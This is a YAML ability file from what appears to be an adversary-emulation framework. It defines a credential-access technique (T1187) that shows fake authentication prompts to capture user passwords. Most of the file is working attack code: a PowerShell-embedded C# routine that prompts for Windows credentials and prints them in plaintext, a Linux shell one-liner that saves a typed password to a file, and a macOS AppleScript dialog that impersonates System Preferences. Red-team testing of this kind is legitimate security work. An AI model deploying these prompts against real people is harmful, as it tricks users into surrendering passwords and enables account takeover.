id: 5c90420e-7972-4125-833b-16c89d5c303f
name: Prompt for user credentials
description: >
  Displays a user authentication prompt to trick the user into providing their
  credentials to dump them in plaintext.
tactic: credential-access
technique:
  id: T1187
  name: Forced Authentication
platforms:
  windows:
    psh:
      command: |
        $type=@"
        using System;
        using System.Text;
        using System.Runtime.InteropServices;
        public static class CredUI
        {
        	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        	private struct CREDUI_INFO
        	{
        	     public int cbSize;
        	     public IntPtr hwndParent;
        	     public string pszMessageText;
        	     public string pszCaptionText;
        	     public IntPtr hbmBanner;
        	}
        	[DllImport("credui.dll", CharSet = CharSet.Auto)]
        	private static extern bool CredUnPackAuthenticationBuffer(int dwFlags, IntPtr pAuthBuffer, uint cbAuthBuffer, StringBuilder pszUserName, ref int pcchMaxUserName, StringBuilder pszDomainName, ref int pcchMaxDomainame, StringBuilder pszPassword, ref int pcchMaxPassword);
        	[DllImport("credui.dll", CharSet = CharSet.Auto)]
        	private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere, int authError, ref uint authPackage, IntPtr InAuthBuffer, uint InAuthBufferSize, out IntPtr refOutAuthBuffer, out uint refOutAuthBufferSize, ref bool fSave, int flags);
        	public static void Prompt() {
        	    CREDUI_INFO credui = new CREDUI_INFO();
        		credui.pszCaptionText = "Reauthenticate user";
        		credui.pszMessageText = "This will allow us to grab your credentials in plaintext";
        		credui.cbSize = Marshal.SizeOf(credui);
        		uint authPackage = 0;
        		IntPtr outCredBuffer = new IntPtr();
        		uint outCredSize;
        		bool save = false;
        		int result = CredUIPromptForWindowsCredentials(ref credui, 0,ref authPackage,IntPtr.Zero, 0, out outCredBuffer, out outCredSize, ref save, 1 /* Generic */);
        		var usernameBuf = new StringBuilder(100);
        		var passwordBuf  = new StringBuilder(100);
        		var domainBuf = new StringBuilder(100);
        		int maxUserName = 100;
        		int maxDomain = 100;
        		int maxPassword = 100;
        		if (result == 0)
        		{
        			if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName, domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
        			{
        				Console.WriteLine("Username: {0}", usernameBuf.ToString());
        				Console.WriteLine("Password: {0}", passwordBuf.ToString());
        				Console.WriteLine("Domain: {0}", domainBuf.ToString());
        				return;
        			}
        		}
        	}
        }
        "@
        Add-Type -TypeDefinition $type;
        [CredUI]::Prompt();
  linux:
    sh:
      command: 'read -sp "Enter Password: " T1187 && echo $T1187 > T1187.txt'
  darwin:
    osa:
      command: |
        tell app "System Preferences" to display dialog "System Preferences requires your password to finish applying updates." & return & return default answer "" with icon 1 with hidden answer
metadata:
  authors:
    - khyberspache
    - bfuzzy1
  tags: []
  version: 3
